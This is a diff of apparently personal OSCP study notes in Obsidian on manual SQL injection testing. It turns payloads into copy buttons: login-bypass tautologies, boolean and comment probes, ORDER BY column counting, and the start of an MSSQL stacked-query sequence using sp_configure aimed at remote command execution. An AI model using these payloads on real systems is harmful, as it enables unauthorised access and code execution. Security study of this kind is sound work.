@@ -4,6 +4,11 @@
 [[PostgresSQL]]
 [[SQLite]]
 
+| Content                        | Notes |
+| ------------------------------ | ----- |
+| [[#🧠 SQL Injection Payloads]] |       |
+| [[#MSSQL RCE]]                 |       |
+
 4 Databases RCE
 https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed
 
@@ -83,9 +88,416 @@ abc
 ``` 
   
 This establishes how the application behaves with valid, nonexistent, negative, and non-numeric values.  
+
+---
+## Basic Tests
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test'`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test''`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+#### 🔓 Basic authentication bypass
+
+Closes the username string and adds an always-true condition.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test' OR 1=1-- -`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Same technique, using a string comparison.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test' OR '1'='1-- -`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Uses an empty-string comparison that is always true.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test' OR ''=''`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
+#### 👤 Username-based bypass
+
+Attempts to preserve a username prefix while adding an always-true condition.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `username' OR 1=1--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Attempts to terminate the username string and comment out the remaining SQL query.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `username'--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
+#### 🧪 Common tautology bypass
+
+Attempts a tautology without a username prefix.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' OR '1'='1'--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Same tautology using different characters.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' OR 'a'='a'--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
+#### Boolean Testing
+
+**Test C — True condition**
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test' AND '1'='1'-- -`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+**Test D — False condition**
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `test' AND '1'='2'-- -`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
+
+#### Errors as hints
+
+Learn to recognise database fingerprints in error messages.
+
+- `System.Data.SqlClient` → MSSQL
+- `MySQL` / `mysqli` → MySQL
+- `org.postgresql` / `PSQLException` → PostgreSQL
+- `ORA-` error codes → Oracle
   
 ---  
-### Basic syntax-breaking probes 
+## Error-Based Testing : Basic syntax-breaking probes 
 
 Single quote  
 ```dataviewjs
@@ -466,57 +878,393 @@ Look for:
   
 ---  
   
-3. Boolean-based testing  
+## Boolean-Based Testing
   
 This is one of the most useful manual tests.  
-  
+
 Try logically equivalent true and false conditions.  
   
 Numeric parameter  
-  
-1 AND 1=1  
-  
-1 AND 1=2  
-  
-1 OR 1=1  
-  
-1 OR 1=2  
-  
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `1 AND 1=1 `;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `1 AND 1=2  `;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `1 OR 1=1 `;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `1 OR 1=2`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
 String parameter  
-  
-' AND '1'='1  
-  
-' AND '1'='2  
-  
-' OR '1'='1  
-  
-' OR '1'='2  
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' AND '1'='1  `;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' AND '1'='2`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' OR '1'='1`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' OR '1'='2`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
   
 If the true condition produces one response and the false condition produces a meaningfully different response, you may have a boolean-based injection point.  
   
 For string parameters, quote closure and comment syntax depend on the underlying query, so these are probes rather than universal payloads.  
   
-  
 ---  
-  
-4. Comment syntax  
+## Comment Syntax
   
 Different DBMSs support different comment styles. Test the ones relevant to the context.  
   
-Comment Syntax  
-  
+`Comment Syntax`  
 Single-line --  
 Hash #  
 Block /* comment */  
   
-  
-Examples:  
-  
-'--  
-  
-'#  
-  
-'/*  
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `'--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `'#`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `'/*`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
   
 Note that -- often requires whitespace or another character after the two dashes, depending on the database.  
   
@@ -524,20 +1272,144 @@ Also, URL encoding, application filtering, and how the parameter is inserted int
   
   
 ---  
-  
-5. UNION injection — initial probes  
+## Union Injection
   
 If the parameter appears injectable and the application displays query results, investigate whether the query accepts a UNION and whether the result is reflected.  
   
 Start by determining the number of columns using the ORDER BY approach:  
-  
-' ORDER BY 1--  
-  
-' ORDER BY 2--  
-  
-' ORDER BY 3--  
-  
-' ORDER BY 4--  
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' ORDER BY 1--  `;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' ORDER BY 2--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' ORDER BY 3--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' ORDER BY 4--  `;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
   
 Continue incrementing until the query errors or the response changes significantly.  
   
@@ -602,18 +1474,10 @@ Different DBMSs have different delay functions and syntax. Don't blindly paste t
   
 For a lab:  
   
-1. Send the normal request several times and establish its baseline response time.  
-  
-  
-2. Introduce a controlled delay condition.  
-  
-  
-3. Repeat the test.  
-  
-  
-4. Compare timings rather than trusting one slow request.  
-  
-  
+8. Send the normal request several times and establish its baseline response time.  
+9. Introduce a controlled delay condition.  
+10. Repeat the test.  
+11. Compare timings rather than trusting one slow request.  
   
 A single slow response is not evidence of SQL injection; network latency and application load can produce false positives.  
   
@@ -640,87 +1504,7 @@ Order Test Objective
 12 sqlmap Automate confirmation and further testing
 
 ---
-## Basic Test
 
-```
-test'
-```
-
-```
-test''
-```
-
-## 🔓 Basic authentication bypass
-
-Closes the username string and adds an always-true condition.
-```
-test' OR 1=1-- -
-```
-
-Same technique, using a string comparison.
-```
-test' OR '1'='1-- -
-```
-
-Uses an empty-string comparison that is always true.
-```
-test' OR ''=''
-```
-
----
-
-## 👤 Username-based bypass
-
-Attempts to preserve a username prefix while adding an always-true condition.
-```
-username' OR 1=1--
-```
-
-Attempts to terminate the username string and comment out the remaining SQL query.
-
-```
-username'--
-```
-
----
-
-## 🧪 Common tautology bypass
-
-Attempts a tautology without a username prefix.
-```
-' OR '1'='1'--
-```
-
-Same tautology using different characters.
-```
-' OR 'a'='a'--
-```
-
----
-## Boolean Testing
-
-**Test C — True condition**
-
-```
-test' AND '1'='1'-- -
-```
-
-**Test D — False condition**
-
-```
-test' AND '1'='2'-- -
-```
-
----
-
-## Errors as hints
-
-Learn to recognise database fingerprints in error messages.
-
-- `System.Data.SqlClient` → MSSQL
-- `MySQL` / `mysqli` → MySQL
-- `org.postgresql` / `PSQLException` → PostgreSQL
-- `ORA-` error codes → Oracle
 
 - ---
 ## Exploit
@@ -729,7 +1513,7 @@ Learn to recognise database fingerprints in error messages.
 1'; EXEC <MSSQL_COMMAND>;--
 ```
 
-## RCE 
+## MSSQL RCE 
 
 ```
 test' ; EXECUTE sp_configure 'show advanced options', 1;;--
